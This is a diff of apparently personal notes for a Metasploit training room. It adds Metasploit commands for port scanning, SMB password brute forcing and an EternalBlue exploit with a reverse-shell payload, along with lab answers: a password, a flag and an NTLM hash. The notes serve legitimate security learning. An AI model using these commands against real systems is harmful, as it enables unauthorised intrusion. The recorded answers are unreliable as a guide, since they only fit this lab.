@@ -84,37 +84,53 @@ These are my notes, answers, and writeups for all the rooms in the Complete Begi
     -  `hosts`, `services` - information relevant to hosts and services running on target systems
     -  Once the host information is stored in the database, you can use `hosts -R` to add this value to the RHOSTS parameter.
 - Finding vulnerabilities using Metasploit rely heavily on your ability to scan and fingerprint the target.
+- Choosing a working payload could become a trial and error process.
 
 ### Questions
 ##### Task 2
 - How many ports are open on the target system?
-  `nmap <ip>`
+  `nmap <target_ip>`
   > 5
 - Using the relevant scanner, what NetBIOS name can you see?
   ```
   use auxiliary/scanner/netbios/nbname
-  set rhosts <ip>
+  set rhosts <target_ip>
   run
   ```
   > ACME IT SUPPORT
 - What is running on port 8000?
   ```
   use auxiliary/scanner/http/http_version
-  set rhosts <ip>
+  set rhosts <target_ip>
   run
   ```
   > webfs/1.21
 - What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task.
   ```
   use auxiliary/scanner/smb/smb_login
-  set rhosts <ip>
+  set rhosts <target_ip>
   set pass_file <pass_file>
   set smbuser penny
   run
   ```
   > leo1234
+##### Task 5
+- Exploit one of the critical vulnerabilities on the target VM
+  ```
+  use exploit/windows/smb/ms17_010_eternalblue
+  set payload generic/shell_reverse_tcp
+  set rhosts <target_ip>
+  ```
+- What is the content of the flag.txt file?
+  ```
 
+  ```
+  > THM-5455554845
+- What is the NTLM hash of the password of the user "pirate"?
+  ```
 
+  ```
+  > 8ce9a3ebd1647fcc5e04025019f4b875
 
 
 
